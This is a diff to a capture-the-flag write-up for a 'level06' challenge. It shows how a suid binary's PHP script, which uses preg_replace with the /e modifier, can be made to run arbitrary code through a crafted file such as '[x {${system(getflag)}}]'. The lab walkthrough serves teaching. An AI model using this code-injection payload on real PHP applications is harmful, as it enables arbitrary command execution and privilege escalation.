@@ -17,12 +17,12 @@ $r = x($argv[1], $argv[2]); print $r;
 The `level06` binary has again this suid bit, which enable execution as root owner `flag06`. \
 After examining it with `strings` and a little `gdb`, we see it uses `execve` to call our script with `argv[1]` and `argv[2]`.
 The php script calls `file_get_contents` with the first argument, and does some regex replacement stuff. The only one that interest us is the first replace: \
-`preg_replace` is called with the `/e` modifier, which enables the interpolation of captured elements. \
+`preg_replace` is called with the `/e` modifier, which enables the execution of the result. \
 Basically, it will replace all `[x ELEMENTS]` with `y("ELEMENTS")` after escaping the captured elements. \
-In php, you can execute variable interpolation by using the `{${` syntax. So we can basically execute any php code we want inside the interpolation like so:
+In php, you can interpolate variables by using the `{${` syntax. So we can basically execute any php code we want inside the interpolation like so:
 ```shell
 $ cat > /tmp/printflag <<EOF
-[x {${system(getflag)}}]
+[x {\${system(getflag)}}]
 EOF
 $ ./level06 /tmp/printflag
 PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
